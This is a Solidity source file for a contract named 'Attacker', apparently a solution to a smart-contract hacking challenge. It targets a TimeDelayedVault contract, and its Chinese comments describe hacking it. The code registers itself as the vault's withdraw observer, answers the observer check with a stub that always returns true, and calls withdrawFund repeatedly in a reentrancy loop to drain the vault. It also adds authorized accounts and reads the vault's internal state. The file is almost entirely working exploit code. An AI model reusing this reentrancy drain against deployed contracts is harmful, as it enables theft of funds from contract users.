pragma solidity ^0.4.18;
import './SafeMath.sol';
import './Ownable.sol';
import './TimeDelayedVault.sol';

contract Attacker is Ownable{
    using SafeMath for uint;

    uint public stack = 0;
    uint constant stackLimit = 10;
    uint public amount;
    TimeDelayedVault vault;

    //初始化要黑的合约对象
    function initilizeVault(address host) external {
      vault = TimeDelayedVault(host);
    }

    //把自己的合约地址设置为Observer
    function setObserver(address account) {
      vault.setObserver(account);
    }

    //实现observe方法，满足require
    function observe() public returns (bool) {
      //withdrawFund();
      return true;
    }

    //销毁合约，并且转账出来，目前没用
    function onDestroy() public{
      vault.resolve();
    }

    //获取到所有的认证用户
    function getAllAuthorizedUsers() public returns (uint) {

      //address[] result = new ;
      /* for(uint i = 0; i < 5; i++){
        address item = vault.authorizedUsers(i);
        if(item != 0x00){
          result.push(item);
        }
      } */
      //address count = vault.authorizedUsers[0];
      return 3;
    }

    //取钱，最后要黑的入口
    function withdrawFund() public {
        //vault = TimeDelayedVault(0x9bff611ca61a18fbcf0f179ecb59ffba00c70968);
        if(stack++ < stackLimit){
          //0xdC75EB0973F96b735087B6B2f20ef73595509354
          vault.withdrawFund();
        }
        //return vault.withdrawFund();
    }

    //增加认证用户
    function addAuthorizedAccount(uint votePosition, address proposal) external {
        //vault = TimeDelayedVault(0x9bff611ca61a18fbcf0f179ecb59ffba00c70968);
        vault.addAuthorizedAccount(votePosition, proposal);
    }

    //获取额外认证的用户地址
    function getAdditionalAuthAddress() public view returns (address) {
      return vault.additionalAuthorizedContract();
    }

    //获取上次取钱时间
    function getLastUpdated() public view returns (uint) {
      return vault.lastUpdated();
    }

    //获取WithdrawObserver
    function getWithdrawObserver() public view returns (address) {
      return vault.withdrawObserver();
    }
}
